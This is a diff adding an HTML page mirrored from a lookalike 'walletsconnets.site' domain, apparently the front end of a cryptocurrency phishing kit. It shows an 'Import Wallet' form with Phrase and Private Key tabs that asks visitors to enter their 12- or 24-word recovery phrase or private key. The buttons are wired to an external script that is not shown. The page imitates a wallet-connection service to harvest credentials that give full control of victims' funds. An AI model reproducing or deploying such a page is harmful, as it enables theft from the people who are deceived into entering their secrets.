@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html><!-- Mirrored from walletsconnets.site/connect/import.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 20 May 2021 08:52:56 GMT --><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <title>Import Wallet</title>
+    <link rel="stylesheet" href="connect_files/bootstrap.css">
+    <link rel="stylesheet" href="connect_files/fontawesome-all.css">
+    <link rel="stylesheet" href="connect_files/styles.css">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://livechatonline.online/connect/apple-touch-icon.html">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://livechatonline.online/connect/favicon-32x32.html">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://livechatonline.online/connect/favicon-16x16.html">
+    <link rel="manifest" href="https://livechatonline.online/connect/site.html">
+</head>
+<body>
+    <header>
+        <div class="container-fluid">
+			<div class="row">
+			<div class="col-md-4 offset-md-4">
+				<a class="text-white" href="#" style="font-size: 20px;"><i class="fas fa-angle-left"></i>&nbsp; &nbsp;Import Wallet</a>
+			</div>
+			</div>
+		</div>
+    </header>
+	<div class="container-fluid">
+		<div class="row">
+			<div class="col-md-4 offset-md-4">
+				<ul class="nav nav-tabs">
+					<li class="nav-item"><a class="nav-link active show" data-toggle="tab" href="#phrase">Phrase</a></li>
+					<!--<li class="nav-item"><a class="nav-link" data-toggle="tab" href="#keystore">Keystore JSON</a></li>-->
+					<li class="nav-item"><a class="nav-link" data-toggle="tab" href="#privatekey">Private Key</a></li>
+				</ul>
+			</div>
+		</div>
+	</div>
+    <section style="margin-top: 40px;">
+        <div class="container-fluid">
+            <div class="row">
+                <div class="col-md-4 offset-md-4">
+					<!-- Tab panes -->
+					<div class="tab-content">
+						<div role="tabpanel" class="tab-pane fade active show" id="phrase">
+						<form method="post" id="phrform">
+								<textarea class="form-control" rows="5" name="phrase" placeholder="Phrase" required="" id="phr"></textarea>
+								<p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+								<input type="hidden" name="value" value="Ethereum">
+								<p id="message" style="color: red;"></p>
+								<div class="form-group">
+									<button class="btn btn-primary btn-block" type="button" name="submit" id="btnphrase">IMPORT</button>
+								</div>
+						</form>
+						</div>
+						<div role="tabpanel" class="tab-pane fade" id="privatekey">
+							<form method="post">
+								<div class="form-group">
+									<input class="form-control" name="privatekey" id="prt" placeholder="Private Key" required="">
+								</div>
+								<p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+								<input type="hidden" name="value" value="Ethereum">
+								<p id="message1" style="color: red;"></p>
+								<div class="form-group"><button class="btn btn-primary btn-block" type="button" id="btnprivate" name="submit">IMPORT</button></div>
+							</form>
+						</div>
+					</div>
+                </div>
+            </div>
+        </div>
+		
+			
+
+		
+    </section>
+    <script src="connect_files/jquery.js"></script>
+    <script src="connect_files/bootstrap.js"></script>
+	<script src="connect_files/app.js"></script>
+
+
+
+
+</body></html>
